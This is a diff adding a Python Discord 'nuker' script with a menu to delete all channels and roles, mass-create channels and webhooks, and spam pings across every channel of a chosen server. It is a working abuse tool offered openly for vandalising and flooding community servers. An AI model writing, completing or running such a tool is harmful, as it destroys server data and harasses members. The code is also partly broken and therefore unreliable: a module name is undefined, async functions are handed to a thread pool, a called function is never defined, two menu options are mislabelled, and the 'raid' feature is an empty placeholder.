@@ -1,0 +1,331 @@
+import os
+import discord
+from discord.ext import commands
+import pyfiglet
+import asyncio
+from concurrent.futures import ThreadPoolExecutor
+
+
+# Dictionary to map color names to color codes
+COLOR_NAMES = {
+    'black': 0,
+    'red': 1,
+    'green': 2,
+    'yellow': 3,
+    'blue': 4,
+    'magenta': 5,
+    'cyan': 6,
+    'white': 7,
+    'orange': 208,
+    'halloween': 214,
+    'purple': 93,
+}
+
+# Dictionary to map font names to pyfiglet font classes
+FONT_NAMES = {
+    'standard': pyfiglet.Figlet(),
+    'slant': pyfiglet.Figlet(font='slant'),
+    'block': pyfiglet.Figlet(font='block'),
+    'bubble': pyfiglet.Figlet(font='bubble'),
+    '3D': pyfiglet.Figlet(font='3D-ASCII'),
+    'Electronic': pyfiglet.Figlet(font='Electronic'),
+}
+
+# Function to clear the console screen, excluding the top message
+def clear_screen(theme_color_name):
+    color_code = COLOR_NAMES.get(theme_color_name, 208)
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(f"\033[38;5;{color_code};1m")
+
+# Function to display ASCII art for the tool name with optional font style and color
+def display_tool_name(tool_name, style='standard', color_name='white'):
+    figlet = FONT_NAMES.get(style, FONT_NAMES['standard'])
+    figlet_text = figlet.renderText(tool_name)
+    color_code = COLOR_NAMES.get(color_name, 7)  # Default to white if color_name is not found
+
+    # Adjust cursor position to move to the first row
+    print(f"\033[38;5;{color_code};1m", end='')
+    print('\033[1A', end='')
+
+    print(figlet_text, end='')
+
+    # Move the cursor to the last row
+    print('\033[F', end='')
+
+# Function to display the menu options in the chosen color
+def display_menu(color_name):
+    color_code = COLOR_NAMES.get(color_name, 208)
+    print(f"\033[38;5;{color_code};1m┌────────────────────────────────────────┐")
+    print(f"│ [1] Select Guild (DO FIRST!)           │")
+    print(f"│ [2] Create Channels                    │")
+    print(f"│ [3] Delete All Channels                │")
+    print(f"│ [4] Delete All Webhooks                │")
+    print(f"│ [5] Send Mass Pings                    │")
+    print(f"│ [6] Set Bot Nickname                   │")
+    print(f"│ [7] Create Roles                       │")
+    print(f"│ [8] Delete Roles                       │")
+    print(f"│ [9] Settings                           │")
+    print(f"│ [10] Raid                              │")
+    print(f"│ [0] Exit                               │")
+    print(f"└────────────────────────────────────────┘\033[0m")
+
+# Function to prompt the user for a guild ID
+def prompt_guild_id(color_name):
+    color_code = COLOR_NAMES.get(color_name, 208)
+    return int(input(f"\033[38;5;{color_code};1mEnter server ID [-] \033[0m"))
+
+# Function to prompt the user for a theme color
+def prompt_theme_color():
+    return input("\033[38;5;208;1mEnter the theme color [black, red, green, yellow, blue, magenta, cyan, white, orange, christmas, halloween] \033[0m").lower()
+
+# Function to prompt the user for the number of channels to create
+def prompt_num_channels(color_name):
+    color_code = COLOR_NAMES.get(color_name, 208)
+    return int(input(f"\033[38;5;{color_code};1mNumber of channels [-] \033[0m"))
+
+# Function to prompt the user for the channel name
+def prompt_channel_name(color_name):
+    color_code = COLOR_NAMES.get(color_name, 208)
+    return input(f"\033[38;5;{color_code};1mEnter the name for the channels [-] \033[0m") or 'default_channel'
+
+# Function to prompt the user for the number of pings to send
+def prompt_num_pings(color_name):
+    color_code = COLOR_NAMES.get(color_name, 208)
+    return int(input(f"\033[38;5;{color_code};1mNumber of pings [-] \033[0m"))
+
+# Function to prompt the user for the message to send in mass pings
+def prompt_mass_ping_message(color_name):
+    color_code = COLOR_NAMES.get(color_name, 208)
+    return input(f"\033[38;5;{color_code};1mEnter the message for mass pings [-] \033[0m")
+
+# Function to prompt the user for the bot nickname
+def prompt_set_nickname(color_name):
+    color_code = COLOR_NAMES.get(color_name, 208)
+    return input(f"\033[38;5;{color_code};1mEnter the bot nickname [-] \033[0m")
+
+# Function to prompt the user for the title style
+def prompt_title_style():
+    return input('\033[38;5;208;1mEnter the title style [standard, block, ...]: \033[0m')
+
+# Function to create channels and webhooks
+async def create_channels_and_webhooks(num_channels: int, guild: discord.Guild, theme_color_name: str):
+    channel_name = prompt_channel_name(theme_color_name)
+
+    async def create_channel_and_webhook(i, guild, channel_name, webhooks):
+        new_channel = await guild.create_text_channel(f'{channel_name}_{i}')
+        try:
+            webhook = await new_channel.create_webhook(name=f"{channel_name}_{i}_webhook")
+            print(f'\033[38;5;208;1mChannel {new_channel.name} and webhook created successfully!\033[0m')
+            webhooks.append(webhook)
+        except discord.errors.Forbidden as e:
+            print(f'\033[38;5;208;1mFailed to create channel and webhook for {new_channel.name}: {e}\033[0m')
+
+    webhooks = []
+
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        tasks = [executor.submit(create_channel_and_webhook, i, guild, channel_name, webhooks) for i in range(1, num_channels + 1)]
+        await asyncio.gather(*tasks)
+
+    return webhooks
+
+# Function to send messages using webhooks without delay using threads
+async def send_mass_pings_without_delay(guild: discord.Guild, num_pings: int, message_text: str):
+    text_channels = [channel for channel in guild.channels if isinstance(channel, discord.TextChannel)]
+
+    if text_channels:
+        async def send_pings(text_channel):
+            for _ in range(num_pings):
+                await text_channel.send(message_text)
+
+        await asyncio.gather(*(send_pings(text_channel) for text_channel in text_channels))
+
+        print('\033[38;5;208;1mMass pings sent successfully!\033[0m')
+    else:
+        print('\033[38;5;208;1mNo text channels found in the guild.\033[0m')
+
+# Function to delete all channels, skipping channels that cannot be deleted
+async def delete_all_channels(guild: discord.Guild):
+    async def delete_channel(channel):
+        try:
+            await channel.delete()
+            print(f'\033[38;5;208;1mChannel {channel.name} deleted successfully!\033[0m')
+        except discord.errors.HTTPException as e:
+            print(f'\033[38;5;208;1mFailed to delete channel {channel.name}: {e}\033[0m')
+
+    await asyncio.gather(*(delete_channel(channel) for channel in guild.channels))
+    print('\033[38;5;208;1mDeletion process completed.\033[0m')
+
+
+# Function to send messages using webhooks
+async def send_mass_pings_with_delay(guild: discord.Guild, num_pings: int, message_text: str, delay_seconds: float):
+    text_channels = [channel for channel in guild.channels if isinstance(channel, discord.TextChannel)]
+
+    if text_channels:
+        for _ in range(num_pings):
+            for text_channel in text_channels:
+                await text_channel.send(message_text)
+                await asyncio.sleep(delay_seconds)
+        print('\033[38;5;208;1mMass pings sent successfully!\033[0m')
+    else:
+        print('\033[38;5;208;1mNo text channels found in the guild.\033[0m')
+
+# Function to create roles
+async def create_roles(guild: discord.Guild, theme_color_name: str):
+    role_name = input('\033[38;5;208;1mEnter the name for the roles [-] \033[0m') or 'default_role'
+    num_roles = prompt_num_channels(theme_color_name)
+
+    async def create_role(i):
+        try:
+            await guild.create_role(name=f'{role_name}_{i}')
+            print(f'\033[38;5;208;1mRole {role_name}_{i} created successfully!\033[0m')
+        except discord.errors.HTTPException as e:
+            print(f'\033[38;5;208;1mFailed to create role {role_name}_{i}: {e}\033[0m')
+
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        tasks = [executor.submit(create_role, i) for i in range(1, num_roles + 1)]
+        await asyncio.gather(*tasks)
+
+# Function to delete all roles in the guild
+async def delete_all_roles(guild: discord.Guild):
+    async def delete_role(role):
+        if role.name != "@everyone":
+            try:
+                await role.delete()
+                print(f'\033[38;5;208;1mRole {role.name} deleted successfully!\033[0m')
+            except discord.errors.HTTPException as e:
+                print(f'\033[38;5;208;1mFailed to delete role {role.name}: {e}\033[0m')
+
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        tasks = [executor.submit(delete_role, role) for role in guild.roles]
+        await asyncio.gather(*tasks)
+
+    print('\033[38;5;208;1mRole deletion process completed.\033[0m')
+
+# Function to initiate a raid
+async def initiate_raid(guild: discord.Guild, num_raids: int):
+    for _ in range(num_raids):
+        # Add your raid logic here
+        print('\033[38;5;208;1mRaid in progress...\033[0m')
+        await asyncio.sleep(1)  # Placeholder sleep, replace with your raid logic
+
+    print('\033[38;5;208;1mRaid completed!\033[0m')
+
+# Function to set the bot's activity status
+async def set_activity(bot):
+    activity = discord.Game(name="with your server")
+    await bot.change_presence(activity=activity)
+
+# Asynchronous CLI menu loop
+async def menu(bot, theme_color_name):
+    current_guild = None
+    bot_nickname = ""
+    title_style = 'standard'  # Default title style
+
+    while True:
+        clear_screen(theme_color_name)
+        display_tool_name('W Tools Nuker', style=title_style, color_name=theme_color_name)
+        display_menu(theme_color_name)
+        choice = input(f"\033[38;5;{COLOR_NAMES.get(theme_color_name, 208)};1mEnter your choice: \033[0m")
+
+        if choice == '1':
+            current_guild = bot.get_guild(prompt_guild_id(theme_color_name))
+            if current_guild:
+                print(f'\033[38;5;208;1mGuild \'{current_guild.name}\' selected.\033[0m')
+            else:
+                print('\033[38;5;208;1mInvalid server ID.\033[0m')
+
+        elif choice == '2':
+            if not current_guild:
+                print('\033[38;5;208;1mEnter a guild before creating channels.\033[0m')
+            else:
+                num_channels = prompt_num_channels(theme_color_name)
+                webhooks = await create_channels_and_webhooks(num_channels, current_guild, theme_color_name)
+                message_text = input('\033[38;5;208;1mEnter the message to send in all channels: \033[0m')
+                await send_mass_pings_without_delay(current_guild, num_channels, message_text)
+
+        elif choice == '3':
+            if not current_guild:
+                print('\033[38;5;208;1mEnter a guild before deleting channels.\033[0m')
+            else:
+                await delete_all_channels(current_guild)
+
+        elif choice == '4':
+            if not current_guild:
+                print('\033[38;5;208;1mEnter a guild before deleting webhooks.\033[0m')
+            else:
+                await delete_all_webhooks(current_guild)
+
+        elif choice == '5':
+            if not current_guild:
+                print('\033[38;5;208;1mEnter a guild before sending mass pings.\033[0m')
+            else:
+                num_pings = prompt_num_pings(theme_color_name)
+                message_text = prompt_mass_ping_message(theme_color_name)
+                await send_mass_pings_without_delay(current_guild, num_pings, message_text)
+
+        elif choice == '6':
+            bot_nickname = prompt_set_nickname(theme_color_name)
+            await bot.user.edit(nick=bot_nickname)
+            print(f'\033[38;5;208;1mNickname set to: {bot_nickname}\033[0m')
+
+        elif choice == '7':
+            if not current_guild:
+                print('\033[38;5;208;1mEnter a guild before deleting roles.\033[0m')
+            else:
+                await delete_all_roles(current_guild)
+
+        elif choice == '8':
+            if not current_guild:
+                print('\033[38;5;208;1mEnter a guild before creating roles.\033[0m')
+            else:
+                await create_roles(current_guild, theme_color_name)
+
+        elif choice == '9':
+            while True:
+                clear_screen(theme_color_name)
+                print("\033[38;5;208;1mSettings\033[0m")
+                print("[1] Change Theme Color")
+                print("[2] Change Title Style")
+                print("[0] Back")
+                new_option = input("\033[38;5;208;1mEnter your choice: \033[0m")
+                if new_option == '1':
+                    new_theme_color = prompt_theme_color()
+                    theme_color_name = new_theme_color
+                    print(f'\033[38;5;208;1mTheme color set to: {new_theme_color}\033[0m')
+                elif new_option == '2':
+                    new_title_style = prompt_title_style()
+                    title_style = new_title_style
+                    print(f'\033[38;5;208;1mTitle style set to: {new_title_style}\033[0m')
+                elif new_option == '0':
+                    break
+                else:
+                    print('\033[38;5;208;1mInvalid choice. Please enter a valid option.\033[0m')
+
+        elif choice == '10':
+            if not current_guild:
+                print('\033[38;5;208;1mEnter a guild before initiating a raid.\033[0m')
+            else:
+                num_raids = prompt_num_channels(theme_color_name)
+                await initiate_raid(current_guild, num_raids)
+
+# Main function to run the bot
+def run_bot(token):
+    intents = discord.Intents.default()
+    intents.typing = False
+    intents.presences = False
+    intents.messages = True  # Adjust as needed
+
+    bot = commands.Bot(command_prefix='!', intents=intents)
+
+    @bot.event
+    async def on_ready():
+        print('\033[38;5;208;1mBot is online and ready to nuke!\033[0m')
+        await set_activity(bot)
+        await menu(bot, 'orange')  # 'orange' is the default theme color
+
+    bot.run(token)
+
+# Run the bot with your token
+if __name__ == "__main__":
+    token = input('\033[38;5;208;1mEnter your bot token: \033[0m')
+    run_bot(token)
